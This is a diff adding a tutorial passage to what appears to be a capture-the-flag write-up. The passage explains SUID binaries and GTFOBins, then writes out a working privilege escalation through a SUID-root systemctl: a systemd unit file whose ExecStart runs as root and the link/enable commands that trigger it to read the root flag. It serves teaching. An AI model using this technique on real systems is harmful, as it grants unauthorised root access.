@@ -718,6 +718,51 @@ find / -perm -4000 -type f 2>/dev/null
 |**/bin/systemctl**|**No**|Service manager; services run as root, so SUID systemctl lets any user run commands as root.|The service controller should never be SUID; this is the way in.|
 
 **What this gives you:** Key finding: `/bin/systemctl` carries the SUID bit. Because systemd services execute as root, you can write a malicious service unit and have systemctl start it as root.
+
+
+_What SUID means._ A normal program runs with the privileges of whoever launches it. A file with the SUID bit set instead runs with the privileges of its **owner**. When the owner is `root`, the program runs as root no matter who starts it. You spot the bit in a long listing as an `s` in the owner's execute position:
+
+```
+ls -l /bin/systemctl
+-rwsr-xr-x 1 root root ... /bin/systemctl
+```
+
+Many SUID-root binaries are legitimate (`passwd`, `sudo`, `su`, `mount`) because they need root for one specific, tightly controlled job. The risk appears when a binary that can run **arbitrary** commands is left SUID, because then any user can borrow root's power for anything. `systemctl` is that case here.
+
+_How to read a GTFOBins entry._ GTFOBins (`https://gtfobins.github.io`) catalogues how common binaries can be abused. Reading an entry follows a fixed path:
+
+1. The red tags at the top are **capabilities** (Shell, Command, File read/write). Pick the one matching your goal; for root access, choose **Shell**.
+2. Inside that section, each lettered variant has **tabs**: `Sudo`, `SUID`, `Capabilities`. Match the tab to how you can reach the binary. A SUID binary means the **SUID** tab.
+3. Copy that tab's command block, then substitute its `/path/to/...` placeholders with your own values.
+
+_How the systemctl payload is built._ systemd runs services as root, and `systemctl` is the tool that tells it to. With SUID `systemctl`, a low-privilege user can define a service and have it executed as root. The payload is a small systemd **unit file**:
+
+```
+[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/rootflag.txt; chmod 666 /tmp/rootflag.txt"
+[Install]
+WantedBy=multi-user.target
+```
+
+Reading it field by field:
+
+|Field|Meaning|
+|---|---|
+|`[Service]`|Declares a service unit.|
+|`Type=oneshot`|Run the command once and exit, rather than staying alive.|
+|`ExecStart=`|The command systemd runs, as root. This is the payload slot: here it copies the root-only flag to a world-readable file.|
+|`[Install]` / `WantedBy=multi-user.target`|Lets the unit be enabled (hooked into normal startup) so `enable --now` will start it.|
+
+Then three commands weaponize it:
+
+```
+TF=$(mktemp).service          # unique temp path for the unit file
+/bin/systemctl link $TF       # register the unit by full path
+/bin/systemctl enable --now $TF   # start it immediately, as root
+```
+
+Because `systemctl` is SUID root, the `ExecStart` command runs with root privileges, giving you root-level actions (here, read the root flag). The `/bin/sh -c "..."` wrapper is only needed to chain two commands in one `ExecStart`; a single command can be written directly.
 <div align="center">
 <br>
 <br>
